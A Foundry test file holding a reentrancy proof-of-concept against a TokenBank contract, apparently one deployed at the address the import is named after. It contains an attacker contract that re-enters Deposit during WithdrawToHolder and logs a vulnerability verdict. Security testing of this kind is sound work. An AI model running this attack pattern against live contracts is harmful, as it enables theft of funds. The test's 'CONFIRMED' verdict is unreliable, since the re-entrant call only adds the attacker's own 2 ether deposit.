// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x627fa62ccbb1c1b04ffaecd72a53e37fc0e17839.sol";

contract ReentrancyAttacker {
    TokenBank public bank;
    uint256 public count;
    
    constructor(TokenBank _bank) payable {
        bank = _bank;
    }
    
    function attackDeposit() public payable {
        bank.Deposit{value: msg.value}();
    }
    
    receive() external payable {
        if (count < 1) {
            count++;
            // Deposit 2 ether to bypass MinDeposit requirement
            bank.Deposit{value: 2 ether}();
        }
    }
}

contract TokenBankReentrancyTest is Test {
    TokenBank public bank;
    ReentrancyAttacker public attacker;
    address owner = makeAddr("owner");

    function setUp() public {
        vm.deal(owner, 10 ether);
        vm.startPrank(owner);
        bank = new TokenBank();
        vm.stopPrank();
    }

    function testReentrancyInWithdrawToHolder() public {
        // Create attacker with 5 ether (3 for initial deposit, 2 for reentrancy)
        attacker = new ReentrancyAttacker{value: 5 ether}(bank);
        
        // Initial deposit 3 ether (above MinDeposit)
        attacker.attackDeposit{value: 3 ether}();
        
        // Verify pre-state and record for differential check
        console2.log("--- BEFORE-Trigger State ---");
        uint256 preBalance = bank.Holders(address(attacker));
        console2.log("Attacker bank balance (pre): ", preBalance);
        assertEq(preBalance, 3 ether, "Pre-reentrancy balance");
        
        // Trigger withdrawal and reentrancy
        console2.log("--- Trigger Operation: WithdrawToHolder ---");
        vm.prank(owner);
        bank.WithdrawToHolder(address(attacker), 1 ether);
        
        // Capture post-trigger state
        console2.log("--- AFTER-Trigger State ---");
        uint256 postBalance = bank.Holders(address(attacker));
        console2.log("Attacker bank balance (post): ", postBalance);

        // Determine vulnerability through differential analysis
        uint256 expectedNormal = preBalance - 1 ether;   // 2 ether: expected without exploit
        uint256 expectedExploit = preBalance + 1 ether;  // 4 ether: expected with exploit
        
        console2.log("Expected normal change: -1 ether");
        console2.log("Actual change: %s ether", (postBalance - preBalance) / 1 ether);
        console2.log("Verdict:");
        
        if (postBalance == expectedExploit) {
            console2.log(">>>>> Vulnerability CONFIRMED: Balance increased by 1 ether due to reentrancy <<<<<");
            console2.log("Vulnerability Exists: Reentrancy allows attacker to manipulate balance during withdrawal");
        } else if (postBalance == expectedNormal) {
            console2.log(">>>>> Vulnerability NOT DETECTED: Withdrawal processed normally <<<<<");
            console2.log("Vulnerability not Exist: Balance decreased as expected (no reentrancy detected)");
        } else {
            console2.log(">>>>> UNEXPECTED BEHAVIOR: Balance changed abnormally <<<<<");
            console2.log("Vulnerability Exists: Abnormal state change during withdrawal");
        }
    }
}